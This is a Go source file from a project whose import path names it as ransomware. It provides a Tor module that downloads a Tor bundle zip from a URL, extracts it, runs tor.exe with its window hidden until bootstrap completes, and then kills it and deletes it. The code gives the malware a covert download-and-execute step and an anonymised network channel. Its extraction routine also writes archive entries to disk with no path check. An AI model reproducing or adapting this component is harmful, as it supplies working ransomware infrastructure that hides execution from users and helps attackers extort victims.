package tor

import (
	"archive/zip"
	"bufio"
	"bytes"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"github.com/mauri870/ransomware/utils"
)

const (
	// IsReadyMessage indicates that tor is ready for connections
	IsReadyMessage = "Bootstrapped 100%: Done"
)

// Tor wraps the tor command line
type Tor struct {
	ZipURL   string    // ZipUrl is the zip url for the tor bundle
	RootPath string    // RootPath is the path to extract the tor bundle zip
	Cmd      *exec.Cmd // Cmd is the tor proxy command
}

// New returns a new Tor instance
func New(zipURL, rootPath string) *Tor {
	return &Tor{ZipURL: zipURL, RootPath: rootPath}
}

// DownloadAndExtract download the tor bundle and extract to a given path
// It also returns the last known error
func (t *Tor) DownloadAndExtract() error {
	if ok := utils.FileExists(t.GetExecutable()); ok {
		return nil
	}

	resp, err := http.Get(t.ZipURL)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	buf := &bytes.Buffer{}
	downloadReader := &utils.DownloadProgressReader{
		Reader: resp.Body, 
		Lenght: resp.ContentLength,
	}

	_, err = io.Copy(buf, downloadReader)
	if err != nil {
		return err
	}

	zipWriter, err := zip.NewReader(bytes.NewReader(buf.Bytes()), int64(buf.Len()))
	if err != nil {
		return err
	}

	writeFile := func(file *zip.File) error {
		path := filepath.Join(t.RootPath, file.Name)
		if file.FileInfo().IsDir() {
			os.MkdirAll(path, file.Mode())
			return nil
		}

		fileReader, err := file.Open()
		if err != nil {
			return err
		}
		defer fileReader.Close()

		targetFile, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, file.Mode())
		if err != nil {
			return err
		}
		defer targetFile.Close()

		if _, err := io.Copy(targetFile, fileReader); err != nil {
			return err
		}
		return nil
	}

	for _, zf := range zipWriter.File {
		err = writeFile(zf)
	}

	return err
}

// Start starts the tor proxy. Start blocks until an error occur or tor bootstraping
// is done
func (t *Tor) Start() error {
	cmd := t.GetExecutable()
	t.Cmd = exec.Command(cmd)
	t.Cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	stdout, err := t.Cmd.StdoutPipe()
	if err != nil {
		return err
	}

	err = t.Cmd.Start()
	if err != nil {
		return err
	}

	scanner := bufio.NewScanner(stdout)
	for scanner.Scan() {
		if strings.Contains(scanner.Text(), IsReadyMessage) {
			break
		}
	}

	return nil
}

// GetExecutable returns the path to tor.exe
func (t *Tor) GetExecutable() string {
	return fmt.Sprintf("%s\\Tor\\tor.exe", t.RootPath)
}

// Kill kill the tor process
func (t *Tor) Kill() error {
	err := t.Cmd.Process.Kill()
	if err != nil {
		return err
	}

	return nil
}

// Clean delete the tor folder
func (t *Tor) Clean() error {
	dir, _ := filepath.Split(t.GetExecutable())
	err := os.RemoveAll(dir)
	if err != nil {
		return err
	}
	return nil
}
